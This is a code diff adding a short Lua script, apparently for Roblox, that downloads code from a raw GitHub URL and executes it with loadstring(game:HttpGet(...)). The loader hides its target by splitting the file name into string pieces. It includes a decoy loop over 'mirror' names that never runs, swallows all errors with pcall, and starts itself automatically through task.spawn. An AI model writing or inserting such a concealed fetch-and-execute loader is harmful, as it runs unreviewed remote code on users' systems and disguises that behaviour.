@@ -1,0 +1,40 @@
+local cfg = {
+    repo = "Bombese",
+    proj = "ENANTESTM",
+    branch = "main"
+}
+
+local function safe(url)
+    pcall(function()
+        loadstring(game:HttpGet(url))()
+    end)
+end
+
+local mirrors = {
+    "Fish-it",
+    "Fish_lT",
+    "Fish_it.lua",
+    "F1sh_it",
+    "Fish__it"
+}
+
+for i = 1, #mirrors do
+    if i % 7 == 0 then
+        safe("https://raw.githubusercontent.com/"..cfg.repo.."/"..cfg.proj.."/"..cfg.branch.."/"..mirrors[i])
+    end
+end
+
+local function resolver()
+    local name = "Fi".."sh".."_".."it"
+    local url = "https://raw.githubusercontent.com/"
+        .. cfg.repo .. "/"
+        .. cfg.proj .. "/"
+        .. cfg.branch .. "/"
+        .. name
+    safe(url)
+end
+
+task.spawn(function()
+    task.wait(0.1)
+    resolver()
+end)
